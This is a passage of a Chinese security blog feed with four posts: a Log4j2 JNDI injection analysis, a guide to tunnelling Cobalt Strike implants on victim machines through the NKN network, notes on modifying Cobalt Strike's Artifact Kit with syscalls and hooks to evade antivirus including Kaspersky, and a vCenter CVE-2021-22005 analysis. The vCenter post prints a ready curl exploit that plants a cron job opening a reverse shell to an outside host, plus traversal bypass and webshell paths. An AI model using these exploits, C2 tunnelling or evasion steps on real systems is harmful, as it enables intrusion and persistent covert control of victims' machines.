    <content type="html"><![CDATA[<p>Apache Log4j是一个基于Java的日志框架，已于2015年8月5日停止维护。Log4j2是其重构升级版本，新增的<code>Lookups</code>方法设计用于通过多种途径动态引入外部变量。<code>log4j2版本 &lt; log4j-2.15.0-rc2</code>可由JNDI注入实现远程代码执行。</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>当POC作为message传递给<code>Logger</code>类的<code>error</code>、<code>fatal</code>等方法后，略去一些非关键流程，会进入到<code>MessagePatternConverter</code>类<code>format</code>方法对<code>$&#123;</code>内容进行解析替换：</p><p><img src="/img/log4j2_a.png"></p><p>之后进入<code>Interpolator</code>类的<code>lookup</code>方法，由前缀值<code>jndi</code>获取到<code>JndiLookup</code>类：</p><p><img src="/img/log4j2_b.png"></p><p>最终调用对应的<code>lookup</code>方法发起请求，也就是遍地开花的dnslog。。。</p><p><img src="/img/log4j2_c.png"></p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>JDK版本&lt;8u191，可通过LDAP引入外部JNDI Reference：</p><p><img src="/img/log4j2_d.png"></p><p>JDK版本&gt;=8u191，当存在<code>org.apache.naming.factory.BeanFactory</code>与<code>com.springsource.org.apache.el</code>等依赖时，可在返回的JNDI Reference中指定相应工厂类及setter方法，或是由LDAP引入序列化链实现RCE：</p><p><img src="/img/log4j2_e.png"></p><p>同时可以结合一些其它<code>StrLookup</code>适当变形，以及配合官方测试用例中脏数据<code>&quot;?Type=A Type&amp;Name=1100110&amp;Char=!&quot;</code>绕过rc1。</p><p><img src="/img/log4j2_g.png"></p><p>RC2版本对此异常进行了捕获。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.docs4dev.com/docs/en/log4j2/2.x/all/manual-lookups.html">Log4j2 Manual Lookups</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3">LOG4J2-3201 - Limit the protocols JNDI can use by default</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Apache Log4j是一个基于Java的日志框架，已于2015年8月5日停止维护。Log4j2是其重构升级版本，新增的&lt;code&gt;Lookups&lt;/code&gt;方法设计用于通过多种途径动态引入外部变量。&lt;code&gt;log4j2版本 &amp;lt; log4j-2.15.0-rc</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="https://hosch3n.github.io/tags/JNDI/"/>
    
    <category term="log4j" scheme="https://hosch3n.github.io/tags/log4j/"/>
    
    <category term="CVE-2021-44228" scheme="https://hosch3n.github.io/tags/CVE-2021-44228/"/>
    
  </entry>
  
  <entry>
    <title>去中心化上线CS</title>
    <link href="https://hosch3n.github.io/2021/11/10/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%B8%8A%E7%BA%BFCS/"/>
    <id>https://hosch3n.github.io/2021/11/10/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%B8%8A%E7%BA%BFCS/</id>
    <published>2021-11-10T09:21:19.000Z</published>
    <updated>2021-11-10T11:40:15.537Z</updated>
    
    <content type="html"><![CDATA[<p>当了回标题党（<del>下次还敢</del>），大佬们轻点打。<strong>仅供研究，不得用于任何非法目的</strong></p><h2 id="上线流程"><a href="#上线流程" class="headerlink" title="上线流程"></a>上线流程</h2><p>起初是看到了<a href="https://github.com/Maka8ka/NGLite">NGLite</a>这个远控工具，了解到NKN区块链网络。发现官方不但提供多语言SDK，连TCP隧道成品<a href="https://github.com/nknorg/nkn-tunnel">nkn-tunnel</a>都给了，果断嫖来搞歪门邪道。</p><ol><li>在本地正常流程启动CS，客户端连接本地服务器，按端口流量转发的套路新建监听器</li></ol><p><img src="/img/p2pcs_a.png"></p><ol start="2"><li>以下图CS4.4为例，木马之后会连接开在受害者本地p2p代理入口的8081端口，<code>172.16.1.1:443</code>为CS监听的本地内网地址与端口</li></ol><p><img src="/img/p2pcs_b.png"></p><ol start="3"><li><p>下载Releases中对应平台的成品，或者自行编译。本地执行<code>nkn-tunnel -from nkn -to 127.0.0.1:443 -v</code>，表示将NKN网络接收到的流量转发到本地443端口。此时会显示<code>Listening at xxx</code>，xxx是随机生成的64个十六进制数（secret seed）</p></li><li><p>在受害者机器上执行<code>nkn-tunnel -from 127.0.0.1:8081 to xxx</code>，表示将受害者本地8081端口接收到的流量转发进NKN网络</p></li><li><p>生成CS的stageless木马，在受害者机器上执行，免VPS上线</p></li></ol><p><img src="/img/p2pcs_c.png"></p><p>看客户案例国内移动和爱奇艺也在用这个网络，目前响应速度挺不错的，但是节点好像不多，抓人应该也不太难哈哈哈。后续可以与远控木马集成为单个二进制文件，也可以作为流量穿透方式的补充，或者被大家玩烂胎死腹中：(</p><p><img src="/img/p2pcs_d.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当了回标题党（&lt;del&gt;下次还敢&lt;/del&gt;），大佬们轻点打。&lt;strong&gt;仅供研究，不得用于任何非法目的&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;上线流程&quot;&gt;&lt;a href=&quot;#上线流程&quot; class=&quot;headerlink&quot; title=&quot;上线流程&quot;&gt;&lt;/a&gt;上线流</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="nkn" scheme="https://hosch3n.github.io/tags/nkn/"/>
    
    <category term="proxy" scheme="https://hosch3n.github.io/tags/proxy/"/>
    
    <category term="tunnel" scheme="https://hosch3n.github.io/tags/tunnel/"/>
    
  </entry>
  
  <entry>
    <title>Artifact集成Syscall与Detours</title>
    <link href="https://hosch3n.github.io/2021/11/02/Artifact%E9%9B%86%E6%88%90Syscall%E4%B8%8EDetours/"/>
    <id>https://hosch3n.github.io/2021/11/02/Artifact%E9%9B%86%E6%88%90Syscall%E4%B8%8EDetours/</id>
    <published>2021-11-02T09:13:35.000Z</published>
    <updated>2021-11-02T12:24:52.111Z</updated>
    
    <content type="html"><![CDATA[<p>Artifact是CS用来做免杀的Kit，可以让生成的PE文件自带免杀特效，相比生成shellcode由外部loader加载更方便。本质上可以理解为将自定义的外部loader集成进CS的接口。</p><ul><li>ArtifactKit并未开源，而且博客之前就被盯上封掉过。。。仅仅记录一下大致流程，具体实现可见参考链接，按照思路自行组装</li></ul><h2 id="修改模板"><a href="#修改模板" class="headerlink" title="修改模板"></a>修改模板</h2><p>以<code>dist-template</code>为例，将<code>patch.c</code>中用于填充定位的1024个A替换为其它字符串，同时替换<code>artifact.cna</code>中<code>indexOf</code>的相应字符串。</p><p>ArtifactKit原本采用4个随机数充当异或密钥，可以考虑实现高级加密算法，也可以只是方便的扩充<code>$key</code>数组的位数。相应地修改<code>artifact.cna</code>中<code>writeb</code>函数，以及<code>patch.c</code>中的异或取余位数、<code>patch.h</code>中结构体的key数组下标。</p><p>如果用mingw交叉编译，只需要去<code>build.sh</code>文件底部加上相应路径（注释掉官方本身自带的几个加快编译速度）。如果用VS编译，stage要在<code>patch.h</code>中加上<code>#define DATA_SIZE 1024</code>或<code>#define DATA_SIZE 271360</code>（big），<code>patch.c</code>中<code>set_key_pointers</code>函数的形式参数改为<code>char * buffer</code>。</p><h2 id="集成Syscall"><a href="#集成Syscall" class="headerlink" title="集成Syscall"></a>集成Syscall</h2><p>在定义功能函数的<code>patch.c</code>中引入<a href="https://github.com/jthuraisamy/Syswhispers2">SysWhispers2</a>与<a href="https://github.com/mai1zhi2/SysWhispers2_x86">SysWhispers2_x86</a>作为64位与32位Syscall函数实现，并将<code>VirtualAlloc</code>、<code>VirtualProtect</code>、<code>CreateThread</code>分别改写为<code>NtAllocateVirtualMemory</code>、<code>NtProtectVirtualMemory</code>、<code>NtCreateThreadEx</code>。</p><ul><li>VS编译时，64位项目<code>patch.c</code>中<code>spawn</code>函数的形式参数改为<code>__int64 length</code></li></ul><p>这样就已经可以过掉不少常见杀软了：</p><p><img src="/img/kitdschook_a.png"></p><p><img src="/img/kitdschook_b.png"></p><h2 id="集成Detours"><a href="#集成Detours" class="headerlink" title="集成Detours"></a>集成Detours</h2><p>与WBG大佬介绍的思路一样，hook相关系统函数，去除sleep期间beacon内存的EXECUTE权限，利用VEH处理sleep后执行时的<code>Access Violation</code>错误，只在执行期间短暂恢复权限。</p><p>可以进一步完善profile支持的<code>HeapAlloc</code>与<code>MapViewOfFile</code>内存申请方式、将被hook函数改为Syscall、适配stage类型调用。这个过程坑相当多，等有生之年完全吃透了再详细记录。（感谢NoOne大哥的全程指导）</p><p>最终绕过卡巴斯基终端安全：</p><p><img src="/img/kitdschook_c.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/">Implementing Syscalls In The Cobaltstrike Artifact Kit</a></p><p><a href="https://xz.aliyun.com/t/9224">记一次cs bypass卡巴斯基内存查杀</a></p><p><a href="https://xz.aliyun.com/t/9399">cs bypass卡巴斯基内存查杀 2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Artifact是CS用来做免杀的Kit，可以让生成的PE文件自带免杀特效，相比生成shellcode由外部loader加载更方便。本质上可以理解为将自定义的外部loader集成进CS的接口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ArtifactKit并未开源，而且博客之前就被盯上封</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="artifact" scheme="https://hosch3n.github.io/tags/artifact/"/>
    
    <category term="syscall" scheme="https://hosch3n.github.io/tags/syscall/"/>
    
    <category term="detours" scheme="https://hosch3n.github.io/tags/detours/"/>
    
    <category term="hook" scheme="https://hosch3n.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>VMware vCenter漏洞分析（二）</title>
    <link href="https://hosch3n.github.io/2021/10/08/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/10/08/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-10-08T15:35:58.000Z</published>
    <updated>2022-05-11T08:06:19.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-22005"><a href="#CVE-2021-22005" class="headerlink" title="CVE-2021-22005"></a>CVE-2021-22005</h2><p>Analytics服务相关端点存在目录穿越写文件，可将</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U2c</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3o</li></ul><p>利用链1：<code>curl -k -X POST &#39;https://1.1.1.1/analytics/telemetry/ph/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/syslog&#39; -d &#39;* * * * * root nc -e /bin/sh 2.2.2.2 1337&#39; -H &#39;Content-Type: application/json&#39;</code></p><p>利用链2：<a href="https://gist.github.com/testanull/5bb925179c4695e51ca400b7370bc252">asdklajsdlkajsdlkajsdakjsdhalskdasdioasiodaklsd.py</a></p><h3 id="AsyncTelemetryController漏洞分析"><a href="#AsyncTelemetryController漏洞分析" class="headerlink" title="AsyncTelemetryController漏洞分析"></a>AsyncTelemetryController漏洞分析</h3><p>vCenter在9月更新修复了一堆漏洞，由官方发布的<a href="https://kb.vmware.com/s/article/85717">CVE-2021-22005缓解措施</a>可以知道漏洞所在服务与Web路径：</p><p><img src="/img/vcenterldfxb_a.png"></p><p>对应路径的rhttpproxy策略在vCenter各版本中也不尽相同：</p><p><img src="/img/vcenterldfxb_b.png"></p><p>下载漏洞修复前后的两个补丁（VMware-vCenter-Server-Appliance-6.7.0.48000-18010531-patch-FP.iso、VMware-vCenter-Server-Appliance-6.7.0.50000-18485166-patch-FP.iso）并解压VMware-analytics的rpm包，反编译对比相关jar包：</p><p><img src="/img/vcenterldfxb_c.png"></p><p>对<code>/ph/api/hyper/send</code>路径的<code>_v</code>、<code>_c</code>、<code>_i</code>请求参数分别绑定给<code>version</code>、<code>collectorId</code>、<code>collectorInstanceId</code>变量，随后调用存在补丁变动的<code>handleSendRequest</code>方法，添加了对传入变量的白名单校验。<code>AsyncTelemetryController</code>类的另一处补丁变动类似，在<code>handleGetLevelRequest</code>方法添加了白名单校验。</p><p><img src="/img/vcenterldfxb_d.png"></p><p>跟进<code>TelemetryService</code>接口相应的具体实现，之前组装好的<code>TelemetryRequest</code>对象被加入了线程池异步调用。在<code>/etc/vmware-analytics/ph-telemetry-prod.xml</code>找到bean相关类。</p><p><img src="/img/vcenterldfxb_e.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdTelemetryService&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.internal.impl.AsyncTelemetryServiceWrapper&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">destroy-method</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.TelemetryLevelBasedTelemetryServiceWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.LogTelemetryService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetObject&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLogTelemetryBaseDir&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;resolve&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.logdir.prod&#125;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLog4j2Context&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.DefaultTelemetryLevelService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phCeipConfigProvider&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.internal.manifest.PropertyControlledManifestContentProviderWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phConfigurationService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phservices.manifest_location&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.ph.PhManifestContentProvider&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;phProdTelemetryLevelServicePhClientFactory&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache.expiration_interval.millis&#125;&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache_size&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>动态调试套路与之前一样，配置文件在<code>/etc/vmware/vmware-vmon/svcCfgfiles/analytics.json</code>，改完重启服务<code>service-control --restart vmware-analytics</code></li></ul><p><code>TelemetryLevelBasedTelemetryServiceWrapper</code>类<code>processTelemetry</code>方法会调用<code>DefaultTelemetryLevelService</code>类<code>getTelemetryLevel</code>方法获取<code>telemetryLevel</code>。</p><p><img src="/img/vcenterldfxb_f.png"></p><p>继续跟进看到需要<code>isCeipEnabled</code>不为默认值<code>false</code>才会继续流程：</p><p><img src="/img/vcenterldfxb_g.png"></p><p>随后调用<code>LogTelemetryService</code>类<code>processTelemetry</code>方法，利用log4j写日志文件至<code>/var/log/vmware/analytics/prod/</code>目录，文件内容为POST请求体数据。</p><p><img src="/img/vcenterldfxb_h.png"></p><p>很自然地想到之前21972目录穿越写文件，不同的是此时存在json后缀名，不能直接写WebShell；也要注意到我们此时是root而非vsphere-ui用户，可以写计划任务。但是构造<code>/../</code>后<code>_c_i</code>目录不存在，导致目录穿越报错：</p><p><img src="/img/vcenterldfxb_i.png"></p><p>可以先发送<code>_i=/any</code>，利用<code>createManager</code>方法的<code>FileUtils.makeParentDirs</code>将<code>_c_i</code>目录创建出来，随后再由目录穿越写计划任务反弹shell。</p><p><img src="/img/vcenterldfxb_j.png"></p><h3 id="DataAppAgentController漏洞分析"><a href="#DataAppAgentController漏洞分析" class="headerlink" title="DataAppAgentController漏洞分析"></a>DataAppAgentController漏洞分析</h3><p>对比官方验证脚本的另一处路径对应jar包，<code>/dataapp/agent</code>路径的<code>action=collect</code>相关代码被整段移除：</p><p><img src="/img/vcenterldfxb_k.png"></p><p>跟进<code>collect</code>方法后经历了各种类方法跳转，将POST请求体中JSON的<code>manifestContent</code>参数值解析后，作为<code>VelocityHelper.executeVelocityExpression</code>方法的入参<code>this._mappingCode</code>。</p><p><img src="/img/vcenterldfxb_l.png"></p><p>接着带入<code>VelocityEngine</code>类<code>evaluate</code>方法作为模板语句动态执行：</p><p><img src="/img/vcenterldfxb_m.png"></p><ul><li>不同版本的Velocity方法名略有不同</li></ul><p>最终 @testbnull 发现可以通过上下文可用的<code>$GLOBAL-logger</code>，利用<code>setFile</code>方法临时修改日志路径到Web路径的方式，写入WebShell实现RCE。</p><p><img src="/img/vcenterldfxb_n.png"></p><p><img src="/img/vcenterldfxb_o.png"></p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>由于Tomcat会将<code>/..;/</code>视作<code>/../</code>，可以利用该特性绕过vCenter某些版本的rhttpproxy的访问限制，也可以用来绕过某些WAF的简单规则。</p><ul><li><code>/analytics/cloudhealth/sdk/..;/..;/ph/api/xxx</code></li></ul><p>漏洞利用还有如下路径可供参考，但我没有仔细测试各个版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;sdk</span><br><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;api&#x2F;state</span><br><span class="line">&#x2F;analytics&#x2F;healthstatus</span><br><span class="line">&#x2F;analytics&#x2F;resourcebundle</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;level</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;level</span><br></pre></td></tr></table></figure><p>对<code>/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/</code>下的WebShell也需要利用路径穿越访问，用得最多的是<code>/idm/..;/shell.jsp</code>，还有如下访问路径可供参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sso-adminserver&#x2F;idp</span><br><span class="line">&#x2F;sso-adminserver&#x2F;sdk</span><br><span class="line">&#x2F;sts&#x2F;STSService</span><br><span class="line">&#x2F;websso</span><br><span class="line">&#x2F;lookupservice</span><br><span class="line">&#x2F;openidconnect</span><br><span class="line">&#x2F;afd</span><br><span class="line">&#x2F;lookup</span><br><span class="line">&#x2F;vmdir</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">VMSA-2021-0020.1</a></p><p><a href="https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/">VMware CVE-2021-22005 Technical &amp; Impact analysis</a></p><p><a href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">Quick note of vCenter RCE (CVE-2021–22005)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-22005&quot;&gt;&lt;a href=&quot;#CVE-2021-22005&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-22005&quot;&gt;&lt;/a&gt;CVE-2021-22005&lt;/h2&gt;&lt;p&gt;Analytics服务相关端点存在目录穿越写</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ESXI" scheme="https://hosch3n.github.io/tags/ESXI/"/>
    
    <category term="VCSA" scheme="https://hosch3n.github.io/tags/VCSA/"/>
    
    <category term="CVE-2021-22005" scheme="https://hosch3n.github.io/tags/CVE-2021-22005/"/>
    
    <category term="CVE-2021-22006" scheme="https://hosch3n.github.io/tags/CVE-2021-22006/"/>
    
    <category term="CVE-2021-22017" scheme="https://hosch3n.github.io/tags/CVE-2021-22017/"/>
    
  </entry>
  
</feed>
